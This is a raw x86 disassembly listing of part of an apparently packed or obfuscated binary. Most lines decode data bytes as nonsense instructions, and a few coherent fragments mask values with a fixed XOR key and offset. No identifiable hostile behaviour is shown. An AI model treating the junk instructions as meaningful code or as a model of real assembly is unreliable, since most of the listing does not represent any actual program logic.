  40c36f:	lea    eax,[edx+eiz*4+0x711b2792]
  40c376:	out    0x75,al
  40c378:	cdq    
  40c379:	int    0x5
  40c37b:	sbb    eax,0x4c700313
  40c380:	or     DWORD PTR [edi],ecx
  40c382:	jl     0x40c34c
  40c384:	sub    eax,0x33e164b6
  40c389:	retf   0x9f5d
  40c38c:	mov    bh,0x70
  40c38e:	sbb    DWORD PTR [eax-0x66],esi
  40c391:	mov    esp,DWORD PTR gs:[bx+0x2f]
  40c396:	rcr    cl,cl
  40c398:	mov    eax,0xc026756b
  40c39d:	lahf   
  40c39e:	add    al,0x59
  40c3a0:	xor    bl,BYTE PTR [ebp-0xfc265b8]
  40c3a6:	pop    DWORD PTR [edi+0x76]
  40c3a9:	xchg   ebp,eax
  40c3aa:	ffree  st(4)
  40c3ac:	lock push 0x73
  40c3af:	jg     0x40c425
  40c3b1:	inc    esi
  40c3b2:	xor    DWORD PTR [ebx-0x36],edx
  40c3b5:	dec    esi
  40c3b6:	and    cl,BYTE PTR [ebp-0x2aa0c081]
  40c3bc:	retf   0xe5ef
  40c3bf:	sub    bl,BYTE PTR [esi-0x4b8e5234]
  40c3c5:	and    eax,0x7a0fddd6
  40c3ca:	push   0x45c6c9f5
  40c3cf:	pusha  
  40c3d0:	mov    cl,0xc6
  40c3d2:	mov    WORD PTR [edi-0x4755a54c],ss
  40c3d8:	dec    esp
  40c3d9:	retf   
  40c3da:	pop    eax
  40c3db:	div    BYTE PTR [ebx+0x3293f8b2]
  40c3e1:	xlat   BYTE PTR ds:[ebx]
  40c3e2:	mov    bh,cl
  40c3e4:	daa    
  40c3e5:	adc    BYTE PTR [ecx],dl
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcl    DWORD PTR [ebx+edi*2-0x7debe6e7],cl
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	nop
  40c453:	add    BYTE PTR [ecx-0x7],0x57
  40c457:	push   ebx
  40c458:	jmp    0x40c3dd
  40c45a:	sbb    edi,edi
  40c45c:	dec    ebp
  40c45d:	adc    eax,0x6ff68333
  40c462:	or     BYTE PTR [edi+0x3218e2ad],dl
  40c468:	jns    0x40c461
  40c46a:	aam    0x48
  40c46c:	inc    esi
  40c46d:	repnz jmp 0x2646:0x18810485
  40c475:	lods   eax,DWORD PTR ds:[esi]
  40c476:	vpcmpeqb xmm7,xmm3,XMMWORD PTR [ebp+ebx*2-0x29]
  40c47c:	jbe    0x40c4bb
  40c47e:	cmp    eax,0x8980c3e7
  40c483:	in     eax,dx
  40c484:	push   esi
  40c485:	dec    esi
  40c486:	and    al,0x61
  40c488:	ret    
  40c489:	inc    eax
  40c48a:	out    dx,al
  40c48b:	sub    dl,ah
  40c48d:	shl    BYTE PTR ds:0xfb9b10c4,0xed
  40c494:	and    DWORD PTR cs:[ebp-0x8f80120],eax
  40c49b:	hlt    
  40c49c:	pop    ss
  40c49d:	push   0x3a
  40c49f:	xor    BYTE PTR [ebx+0x3ca0c015],0x5b
  40c4a6:	or     edx,esi
  40c4a8:	xlat   BYTE PTR ds:[ebx]
  40c4a9:	in     al,dx
  40c4aa:	int3   
  40c4ab:	pusha  
  40c4ac:	or     cl,al
  40c4ae:	jmp    0x40c48b
  40c4b0:	mov    al,ds:0xc4c750e6
  40c4b5:	mov    dh,0x93
  40c4b7:	in     al,0x5b
  40c4b9:	ficomp WORD PTR [ebx+0x77]
  40c4bc:	and    DWORD PTR [esi+0x6f3a9e8f],0x1b
  40c4c3:	push   0xd0885d89
  40c4c8:	clc    
  40c4c9:	nop
  40c4ca:	popa   
  40c4cb:	pop    ds
  40c4cc:	add    bh,dl
  40c4ce:	adc    eax,DWORD PTR [eax+0x636cd80f]
  40c4d4:	or     al,0x0
  40c4d6:	inc    eax
  40c4d7:	mov    ebx,0xb98bb64a
  40c4dc:	sub    ebp,edi
  40c4de:	out    dx,eax
  40c4df:	or     al,dh
  40c4e1:	popf   
  40c4e2:	xor    bh,BYTE PTR [edi+0x6b]
  40c4e5:	sub    ebp,DWORD PTR [esi+esi*2+0x17]
  40c4e9:	mov    ch,0x44
  40c4eb:	sub    DWORD PTR [edx-0x27],ecx
  40c4ee:	mov    ds:0x19f2294c,eax
  40c4f3:	jno    0x40c4ad
  40c4f5:	cs mov ebp,0xb9b766b2
  40c4fb:	mov    BYTE PTR [ebp+edi*1+0x23],dl
  40c4ff:	lock (bad) 
  40c501:	mov    ebp,0x252cc52e
  40c506:	jo     0x40c495
  40c508:	jle    0x40c543
  40c50a:	xor    BYTE PTR [eax],cl
  40c50c:	jo     0x40c518
  40c50e:	cmp    ch,BYTE PTR [ecx]
  40c510:	push   edx
  40c511:	ret    
  40c512:	into   
  40c513:	call   0xa88f:0x37a4abdb
  40c51a:	mov    ecx,0x31f3ed01
  40c51f:	pop    eax
  40c520:	push   ss
  40c521:	cli    
  40c522:	loop   0x40c4ec
  40c524:	sub    BYTE PTR [eax-0x1a7ca261],ch
  40c52a:	out    dx,al
  40c52b:	dec    ebx
  40c52c:	push   0xecacd507
  40c531:	std    
  40c532:	dec    ecx
  40c533:	iret   
  40c534:	les    ebx,FWORD PTR [ebx+0x46fa2d82]
  40c53a:	test   BYTE PTR [ecx+0x6bddd0ce],0x9
  40c541:	int    0x2c
  40c543:	push   ebx
  40c544:	popf   
  40c545:	int3   
  40c546:	mov    ecx,0x5429f983
  40c54b:	out    0x15,al
  40c54d:	or     BYTE PTR ds:0x1737f5ee,dh
  40c553:	pop    edx
  40c554:	cmp    ebx,ebx
  40c556:	shl    DWORD PTR [esi+0x2aa14e29],0xd3
  40c55d:	loopne 0x40c501
  40c55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c560:	enter  0x6a71,0x1c
  40c564:	fcmovnu st,st(3)
  40c566:	sub    bh,BYTE PTR [ebp-0x24]
  40c569:	sub    eax,0x9bb5a387
  40c56e:	hlt    
  40c56f:	pop    ebx
  40c570:	inc    edx
  40c571:	les    eax,FWORD PTR [edx+0x1363d7b8]
  40c577:	push   es
  40c578:	dec    esp
  40c579:	stos   BYTE PTR es:[edi],al
  40c57a:	cmp    esp,DWORD PTR [esp+eiz*4]
  40c57d:	mov    ds:0xe92c5b86,al
  40c582:	push   es
  40c583:	scas   al,BYTE PTR es:[edi]
  40c584:	mov    ch,0x5d
  40c586:	sbb    ah,bh
  40c588:	loopne 0x40c58e
  40c58a:	in     eax,dx
  40c58b:	repnz mov bl,0x99
  40c58e:	inc    esi
  40c58f:	loopne 0x40c60a
  40c591:	inc    ebp
  40c592:	lods   eax,DWORD PTR ds:[esi]
  40c593:	push   edi
  40c594:	dec    edi
  40c595:	pop    es
  40c596:	xor    DWORD PTR [esi],esi
  40c598:	mov    edi,ss
  40c59a:	je     0x40c571
  40c59c:	adc    al,dh
  40c59e:	mov    bl,0x62
  40c5a0:	add    ebp,DWORD PTR [ebx]
  40c5a2:	inc    edx
  40c5a3:	leave  
  40c5a4:	xor    ecx,DWORD PTR [edx+eiz*8+0x14]
  40c5a8:	adc    eax,eax
  40c5aa:	jg     0x40c54f
  40c5ac:	sar    DWORD PTR [edi+edi*1-0x4f],0xa
  40c5b1:	test   ah,bl
  40c5b3:	or     eax,0xa7ce4628
  40c5b8:	push   edx
  40c5b9:	pop    ds
  40c5ba:	jl     0x40c5ea
  40c5bc:	ret    0xb6da
  40c5bf:	sbb    ecx,0x54bab92e
  40c5c5:	pop    es
  40c5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5c7:	mov    ah,0x40
  40c5c9:	jb     0x40c56f
  40c5cb:	adc    eax,0x4ed557bb
  40c5d0:	pop    ebx
  40c5d1:	mov    esi,0x7c4a316d
  40c5d6:	sub    bh,BYTE PTR [eax-0x44]
  40c5d9:	pop    esi
  40c5da:	aad    0x3f
  40c5dc:	test   BYTE PTR [edx+edx*2+0x2c],cl
  40c5e0:	scas   al,BYTE PTR es:[edi]
  40c5e1:	push   ebp
  40c5e2:	les    ecx,FWORD PTR [esi]
  40c5e4:	inc    ecx
  40c5e5:	mov    al,0xb5
  40c5e7:	bound  edx,QWORD PTR [edx+0x73]
  40c5ea:	mov    eax,ds:0x60c33d2a
  40c5ef:	in     al,dx
  40c5f0:	ror    DWORD PTR [eax-0x33],1
  40c5f3:	data16 test al,0xf1
  40c5f6:	mov    bh,0xce
  40c5f8:	jbe    0x40c5bd
  40c5fa:	adc    dl,BYTE PTR [ecx-0x35]
  40c5fd:	loop   0x40c586
  40c5ff:	pusha  
  40c600:	sub    eax,0x8299db9b
  40c605:	cdq    
  40c606:	fsub   st,st(6)
  40c608:	mov    cl,BYTE PTR gs:0xd0275373
  40c60f:	jg     0x40c682
  40c611:	jnp    0x40c5ca
  40c613:	into   
  40c614:	scas   al,BYTE PTR es:[edi]
  40c615:	dec    eax
  40c616:	lds    edi,FWORD PTR [eax+0x340087b]
  40c61c:	daa    
  40c61d:	lahf   
  40c61e:	daa    
  40c61f:	xchg   bh,cl
  40c621:	cmp    dl,BYTE PTR [ebx]
  40c623:	adc    al,0x4f
  40c625:	imul   edi,DWORD PTR [ebp+0xc],0xc937302d
  40c62c:	pushf  
  40c62d:	cmp    esi,DWORD PTR [esi-0x19]
  40c630:	fiadd  DWORD PTR [edx+0x3aab191]
  40c636:	daa    
  40c637:	jge    0x40c628
  40c639:	das    
  40c63a:	sub    edi,DWORD PTR [ecx+edx*4]
  40c63d:	mov    DWORD PTR [eax-0x43decd11],0x93357c5b
  40c647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c648:	mov    ds:0x2050860c,eax
  40c64d:	jmp    0x38d17ae5
  40c652:	(bad)  
  40c654:	and    eax,0x57522e30
  40c659:	mov    esp,0xef54f2dc
  40c65e:	test   al,0x3c
  40c660:	outs   dx,BYTE PTR ds:[esi]
  40c661:	cmp    al,0x4d
  40c663:	adc    ecx,eax
  40c665:	in     eax,dx
  40c666:	js     0x40c66b
  40c668:	int3   
  40c669:	call   0xca110c86
  40c66e:	(bad)  
  40c66f:	loope  0x40c6ca
  40c671:	inc    ebx
  40c672:	pop    ebp
  40c673:	cdq    
  40c674:	xchg   edx,eax
  40c675:	(bad)  
  40c676:	test   al,0x3c
  40c678:	hlt    
  40c679:	hlt    
  40c67a:	adc    edx,DWORD PTR ds:[edx]
  40c67d:	push   edx
  40c67e:	stc    
  40c67f:	and    BYTE PTR [eax],bl
  40c681:	jbe    0x40c6c8
  40c683:	dec    eax
  40c684:	inc    ebp
  40c685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c686:	xor    ebp,DWORD PTR gs:[edx+0x704a5a34]
  40c68d:	push   edx
  40c68e:	leave  
  40c68f:	cmp    eax,0x4b827331
  40c694:	pushf  
  40c695:	ror    BYTE PTR ds:0x729bbe99,0x32
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x4631653f],dl
  40c6de:	and    BYTE PTR [edx],bh
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	pop    esi
  40c6e9:	in     eax,0x24
  40c6eb:	mov    esp,0x5739b940
  40c6f0:	or     dl,BYTE PTR [ecx-0x77aa50f1]
  40c6f6:	pop    ebp
  40c6f7:	inc    ebx
  40c6f8:	mov    eax,0xa0a01401
  40c6fd:	jmp    0xf062ed9c
  40c702:	mov    esi,0x30606114
  40c707:	jecxz  0x40c6e6
  40c709:	adc    al,ah
  40c70b:	retf   0xea5a
  40c70e:	adc    eax,edx
  40c710:	dec    ebx
  40c711:	shl    DWORD PTR [esi+eax*4],0x97
  40c715:	in     al,0x1a
  40c717:	in     eax,0xd6
  40c719:	inc    esi
  40c71a:	or     ebx,ecx
  40c71c:	xchg   DWORD PTR [ecx+0x54],eax
  40c71f:	mov    ch,0x97
  40c721:	cmc    
  40c722:	pop    esi
  40c723:	xchg   ebx,eax
  40c724:	xlat   BYTE PTR ds:[ebx]
  40c725:	mov    DWORD PTR [ebx+0x42f34093],esp
  40c72b:	mov    ecx,0xb7d532c1
  40c730:	ds xchg esp,eax
  40c732:	es push ebp
  40c734:	fwait
  40c735:	mov    ds:0x929d2d3a,al
  40c73a:	mov    al,0xed
  40c73c:	cmc    
  40c73d:	inc    ebx
  40c73e:	mov    DWORD PTR [ebx+0x5],ecx
  40c741:	pushf  
  40c742:	loope  0x40c7c2
  40c744:	sub    eax,0x73e51a6d
  40c749:	(bad)  
  40c74a:	sbb    al,0x7
  40c74c:	or     al,0x87
  40c74e:	pop    ebx
  40c74f:	push   ecx
  40c750:	repz sar BYTE PTR [esi-0x664fe9f8],0xf5
  40c758:	xor    BYTE PTR [esi],0x39
  40c75b:	xchg   ebx,eax
  40c75c:	jmp    0xca92:0xdf9b588f
  40c763:	test   DWORD PTR [ebp+ebx*1+0x63],edx
  40c767:	jl     0x40c782
  40c769:	mov    ds:0x1d683fb6,al
  40c76e:	inc    ebx
  40c76f:	mov    edi,0x3d33aa1d
  40c774:	jmp    0xe79b98fb
  40c779:	scas   al,BYTE PTR es:[edi]
  40c77a:	add    al,0x2c
  40c77c:	imul   edi,DWORD PTR [edi*2+0x7ec10a1a],0x13
  40c784:	cmp    bh,al
  40c786:	dec    esi
  40c787:	push   ebx
  40c788:	cmp    al,0x71
  40c78a:	sbb    DWORD PTR [edx-0x7151fbd9],ebx
  40c790:	in     eax,dx
  40c791:	adc    eax,0xeb3ec03f
  40c796:	shl    BYTE PTR [ebx-0x6f],1
  40c799:	xchg   edi,eax
  40c79a:	call   0x19c6:0xb768560d
  40c7a1:	popf   
  40c7a2:	les    edi,FWORD PTR [edx-0x20479040]
  40c7a8:	ss jmp 0xccc8:0xe1fb340e
  40c7b0:	and    al,0x54
  40c7b2:	rcr    DWORD PTR [edx],1
  40c7b4:	mov    edi,0x3eacf55e
  40c7b9:	test   al,0x93
  40c7bb:	je     0x40c76d
  40c7bd:	or     bh,bh
  40c7bf:	shr    BYTE PTR [eiz*1+0x48a9cae8],1
  40c7c6:	loopne 0x40c754
  40c7c8:	les    eax,FWORD PTR [eax]
  40c7ca:	cwde   
  40c7cb:	into   
  40c7cc:	jp     0x40c786
  40c7ce:	retf   
  40c7cf:	and    al,0x27
  40c7d1:	enter  0x56c7,0xca
  40c7d5:	or     BYTE PTR [eax],ch
  40c7d7:	(bad)  
  40c7d8:	js     0x40c80e
  40c7da:	xchg   esi,eax
  40c7db:	cmp    ebp,DWORD PTR [ecx]
  40c7dd:	inc    ebx
  40c7de:	lahf   
  40c7df:	lea    edi,[ecx+edx*1-0x69]
  40c7e3:	or     eax,0xe657da5f
  40c7e8:	cs sub al,0xa0
  40c7eb:	dec    esi
  40c7ec:	fisttp WORD PTR [esi]
  40c7ee:	les    esi,FWORD PTR [eax-0x6064298e]
  40c7f4:	and    ebx,DWORD PTR [ebp-0x68]
  40c7f7:	mov    cl,0xf7
  40c7f9:	sti    
  40c7fa:	xor    DWORD PTR [edi+edi*4-0x7193b42],edi
  40c801:	jno    0x40c7ce
  40c803:	imul   DWORD PTR [ecx+0x4f5716a3]
  40c809:	rol    ebx,0xe8
  40c80c:	lahf   
  40c80d:	in     eax,0x87
  40c80f:	out    0x60,eax
  40c811:	mov    al,0x22
  40c813:	adc    ah,BYTE PTR [eax+0x74]
  40c816:	(bad)  [esi]
  40c818:	and    esi,DWORD PTR [edi-0x4369956d]
  40c81e:	test   al,0x2b
  40c820:	loope  0x40c7b6
  40c822:	in     eax,dx
  40c823:	inc    ebx
  40c824:	mov    dh,0x6a
  40c826:	sub    al,0xdf
  40c828:	ror    DWORD PTR [ebx+eiz*1+0x4f],1
  40c82c:	cmp    esp,ebp
  40c82e:	aam    0x4c
  40c830:	clc    
  40c831:	stos   BYTE PTR es:[edi],al
  40c832:	cmp    cl,dh
  40c834:	push   edi
  40c835:	fisttp WORD PTR [ebp+0x5a]
  40c838:	mov    bl,0x71
  40c83a:	jmp    0xde37:0x9510ce07
  40c841:	xchg   esi,eax
  40c842:	cmp    DWORD PTR [ebp-0x795aba2e],0xffffffc2
  40c849:	mov    ecx,0x551c56f4
  40c84e:	imul   esi,ebx,0x14022c5b
  40c854:	sbb    BYTE PTR [ebx+0xd],0xcb
  40c858:	psubsb mm0,mm6
  40c85b:	into   
  40c85c:	dec    edi
  40c85d:	mov    ch,0x55
  40c85f:	xchg   edi,eax
  40c860:	mov    WORD PTR [edi],ds
  40c862:	jmp    0x40c834
  40c864:	(bad)  
  40c865:	mov    eax,ds:0x4cda43d5
  40c86a:	sbb    ah,BYTE PTR [ebp-0x4b4c60fa]
  40c870:	pop    ebx
  40c871:	mov    BYTE PTR [eax-0x3a],ah
  40c874:	or     eax,esi
  40c876:	and    BYTE PTR [esi+edi*2],bl
  40c879:	nop
  40c87a:	les    edx,FWORD PTR [edx-0x48a85f68]
  40c880:	shl    DWORD PTR [ebx+0x4d],cl
  40c883:	in     eax,dx
  40c884:	sub    al,0x77
  40c886:	scas   eax,DWORD PTR es:[edi]
  40c887:	adc    BYTE PTR [ebx-0xd],ch
  40c88a:	(bad)  
  40c88b:	xor    DWORD PTR [esi],ebp
  40c88d:	jmp    0x406a8e1d
  40c892:	data16 add al,0x99
  40c895:	xor    BYTE PTR [ebp-0x4f],0x9c
  40c899:	test   esp,ebx
  40c89b:	push   ss
  40c89c:	sub    BYTE PTR [ebx+0x3d6d698f],0xc5
  40c8a3:	shr    DWORD PTR [ebp+0x6b3643e1],cl
  40c8a9:	add    esp,DWORD PTR [edx+0x4c]
  40c8ac:	cmp    al,0x19
  40c8ae:	stos   BYTE PTR es:[edi],al
  40c8af:	sti    
  40c8b0:	ficomp DWORD PTR [ebx]
  40c8b2:	mov    edi,esp
  40c8b4:	into   
  40c8b5:	fcom   QWORD PTR ds:0xb1175fd0
  40c8bb:	xchg   ebp,eax
  40c8bc:	test   dl,bl
  40c8be:	clc    
  40c8bf:	test   DWORD PTR [ecx+ebx*8+0x58fa0d5f],ebx
  40c8c6:	sbb    al,0x21
  40c8c8:	and    eax,0x74c62d94
  40c8cd:	jne    0x40c8a0
  40c8cf:	retf   0x6780
  40c8d2:	push   es
  40c8d3:	sub    al,dl
  40c8d5:	push   ebx
  40c8d6:	hlt    
  40c8d7:	xor    BYTE PTR [edi-0x55],ch
  40c8da:	push   ss
  40c8db:	stc    
  40c8dc:	mov    ecx,0x66e271e8
  40c8e1:	test   al,0x9d
  40c8e3:	stos   BYTE PTR es:[edi],al
  40c8e4:	mov    ch,0xd0
  40c8e6:	(bad)  
  40c8e7:	mov    ah,0x40
  40c8e9:	daa    
  40c8ea:	add    BYTE PTR [ebp+ecx*4-0x83d4a43],al
  40c8f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8f2:	paddb  mm3,QWORD PTR [eax+0x57f70220]
  40c8f9:	mov    bl,0xd6
  40c8fb:	jmp    0x40c891
  40c8fd:	dec    edx
  40c8fe:	das    
  40c8ff:	ins    BYTE PTR es:[edi],dx
  40c900:	popf   
  40c901:	adc    DWORD PTR [ecx+0x14],ebp
  40c904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c905:	retf   0x3304
  40c908:	mov    ecx,0x87a10e30
  40c90d:	out    0xee,eax
  40c90f:	jge    0x40c971
  40c911:	arpl   WORD PTR [eax-0x5a558233],sp
  40c917:	je     0x40c98e
  40c919:	push   es
  40c91a:	push   ecx
  40c91b:	test   BYTE PTR [esi-0x113fc6c9],bh
  40c921:	jnp    0x40c96b
  40c923:	push   ds
  40c924:	adc    al,0xec
  40c926:	in     al,dx
  40c927:	aas    
  40c928:	dec    esp
  40c929:	xchg   ebx,eax
  40c92a:	and    eax,0x8b8fbfb1
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    ecx,ebx
  40c945:	xchg   ecx,eax
  40c946:	jg     0x40c9a3
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	dec    BYTE PTR [esi-0x72]
  40c953:	adc    bh,BYTE PTR [esi-0x7f]
  40c956:	xchg   DWORD PTR [eax+0x57818a17],esi
  40c95c:	cwde   
  40c95d:	and    DWORD PTR [ecx],esp
  40c95f:	jmp    FWORD PTR [ecx-0x67]
  40c962:	mov    edx,0xc5ea70b7
  40c967:	in     eax,dx
  40c968:	mov    bh,0x92
  40c96a:	sub    BYTE PTR [edi+0x2e],ah
  40c96d:	ficom  DWORD PTR [edi+0x76]
  40c970:	mov    sp,0x8ab9
  40c974:	push   ebx
  40c975:	cld    
  40c976:	aas    
  40c977:	daa    
  40c978:	(bad)  
  40c979:	fldenv [edx+eiz*1+0x24b1cead]
  40c980:	mov    ds:0x97ed039b,al
  40c985:	adc    esi,DWORD PTR [ebx+ecx*2-0x7f]
  40c989:	ins    DWORD PTR es:[edi],dx
  40c98a:	aad    0xba
  40c98c:	jecxz  0x40c94c
  40c98e:	mov    DWORD PTR [ebx-0xac3a0e6],ecx
  40c994:	mov    esi,0x2799f058
  40c999:	sub    eax,0x93ade8b9
  40c99e:	jecxz  0x40c92e
  40c9a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a1:	adc    edi,esi
  40c9a3:	lods   al,BYTE PTR ds:[esi]
  40c9a4:	push   cs
  40c9a5:	das    
  40c9a6:	fs int3 
  40c9a8:	retf   0xf956
  40c9ab:	retf   0x87ad
  40c9ae:	dec    edx
  40c9af:	std    
  40c9b0:	xor    DWORD PTR [eax-0x10b5823],edi
  40c9b6:	sbb    al,0x6b
  40c9b8:	fsubp  st(0),st
  40c9ba:	pop    esp
  40c9bb:	jnp    0x40c979
  40c9bd:	push   edi
  40c9be:	mov    esp,0x8a8f37b4
  40c9c3:	push   edx
  40c9c4:	push   edi
  40c9c5:	mov    ?,ebx
  40c9c7:	pop    ds
  40c9c8:	jnp    0x40ca3f
  40c9ca:	scas   eax,DWORD PTR es:[edi]
  40c9cb:	add    dl,dl
  40c9cd:	sub    ebp,esi
  40c9cf:	mov    esi,0x6cb94d8b
  40c9d4:	mul    BYTE PTR [edi-0x2c]
  40c9d7:	aad    0xd0
  40c9d9:	inc    esi
  40c9da:	jno    0x40c992
  40c9dc:	dec    ecx
  40c9dd:	fwait
  40c9de:	sub    al,0x13
  40c9e0:	jle    0x40ca5a
  40c9e2:	loop   0x40ca4b
  40c9e4:	aad    0x61
  40c9e6:	xor    eax,0x757dcc44
  40c9eb:	fsubrp st(0),st
  40c9ed:	mov    ebx,fs
  40c9ef:	sub    BYTE PTR [edi-0x49],ch
  40c9f2:	ins    DWORD PTR es:[edi],dx
  40c9f3:	(bad)  
  40c9f4:	jnp    0x40ca0e
  40c9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f7:	cli    
  40c9f8:	retf   
  40c9f9:	jmp    0x6fcfadce
  40c9fe:	dec    esi
  40c9ff:	push   ds
  40ca00:	sbb    al,0x97
  40ca02:	push   ds
  40ca03:	cmp    eax,0xfc748d77
  40ca08:	ins    DWORD PTR es:[edi],dx
  40ca09:	adc    DWORD PTR cs:[edx],esp
  40ca0c:	cmp    dl,BYTE PTR [ecx-0x38]
  40ca0f:	in     al,dx
  40ca10:	or     DWORD PTR [esi-0x4449c677],ebp
  40ca16:	mul    DWORD PTR [edi]
  40ca18:	xor    bh,BYTE PTR [edi]
  40ca1a:	xchg   di,ax
  40ca1c:	mov    ds:0x7005a8a8,al
  40ca21:	push   eax
  40ca22:	mov    DWORD PTR [ebp+ebp*1+0x3c],edi
  40ca26:	mov    fs,WORD PTR [edx-0xa]
  40ca29:	nop
  40ca2a:	jmp    0x40ca5d
  40ca2c:	fidivr DWORD PTR [ecx+0x10]
  40ca2f:	adc    DWORD PTR [ebx+0x6a648277],ecx
  40ca35:	add    eax,0x4341ce8a
  40ca3a:	xchg   ecx,eax
  40ca3b:	pop    edi
  40ca3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca3d:	jp     0x40ca8c
  40ca3f:	sub    al,0x2
  40ca41:	fld    QWORD PTR [ebp+0x44]
  40ca44:	dec    ebx
  40ca45:	ds dec esi
  40ca47:	sbb    dl,BYTE PTR ds:0x7546e4a5
  40ca4d:	push   eax
  40ca4e:	lock into 
  40ca50:	cli    
  40ca51:	dec    ecx
  40ca52:	adc    DWORD PTR [esi+0x7868b22e],edi
  40ca58:	fs pop ds
  40ca5a:	call   0x71b:0x7b6cf259
  40ca61:	add    DWORD PTR [edx],0xf6fc773b
  40ca67:	cmp    al,0x81
  40ca69:	mov    eax,0xddc5fe2e
  40ca6e:	out    dx,eax
  40ca6f:	adc    al,0x20
  40ca71:	mov    edx,0x25b57c5f
  40ca76:	ja     0x40ca72
  40ca78:	jecxz  0x40cad5
  40ca7a:	fwait
  40ca7b:	pushaw 
  40ca7d:	fwait
  40ca7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca7f:	push   esp
  40ca80:	and    BYTE PTR [edx],0x43
  40ca83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca84:	dec    edx
  40ca85:	ror    BYTE PTR [ebp-0x48d37ff5],cl
  40ca8b:	pop    ebp
  40ca8c:	push   0x95ca87c5
  40ca91:	int3   
  40ca92:	sbb    dh,bl
  40ca94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca95:	fsub   st(3),st
  40ca97:	aam    0xe8
  40ca99:	add    al,BYTE PTR ss:[esi]
  40ca9c:	mov    eax,DWORD PTR [edi+0x77]
  40ca9f:	data16 mov dh,0xd6
  40caa2:	je     0x40ca81
  40caa4:	jg     0x40ca3a
  40caa6:	mov    gs:0xf76ee70b,al
  40caac:	lods   eax,DWORD PTR ds:[esi]
  40caad:	mov    DWORD PTR [esi],esi
  40caaf:	push   esp
  40cab0:	aas    
  40cab1:	loopne 0x40cae4
  40cab3:	aad    0x59
  40cab5:	das    
  40cab6:	sub    bl,al
  40cab8:	test   eax,0xcf0729a3
  40cabd:	pushf  
  40cabe:	ins    BYTE PTR es:[edi],dx
  40cabf:	xor    edx,DWORD PTR [ebx+eax*1-0x41]
  40cac3:	lods   al,BYTE PTR ds:[esi]
  40cac4:	aam    0xd
  40cac6:	jne    0x40cb22
  40cac8:	adc    ebp,ebp
  40caca:	mov    bl,0x27
  40cacc:	mov    bl,BYTE PTR cs:[edi+0x3]
  40cad0:	in     eax,dx
  40cad1:	pop    eax
  40cad2:	bswap  ecx
  40cad4:	cwde   
  40cad5:	nop
  40cad6:	loopne 0x40ca6e
  40cad8:	fadd   QWORD PTR [ebx-0x7550aadb]
  40cade:	enter  0x27ff,0xd3
  40cae2:	adc    dl,BYTE PTR [ecx+0x839655d]
  40cae8:	test   al,0x4
  40caea:	rcr    esp,0xc6
  40caed:	je     0x40cad0
  40caef:	les    ecx,FWORD PTR [edx]
  40caf1:	jns    0x40cb17
  40caf3:	lds    eax,FWORD PTR [ebx]
  40caf5:	gs retf 
  40caf7:	pop    eax
  40caf8:	or     DWORD PTR [esi-0x3629e023],esp
  40cafe:	push   DWORD PTR [ebx+esi*1]
  40cb01:	frstor [ecx]
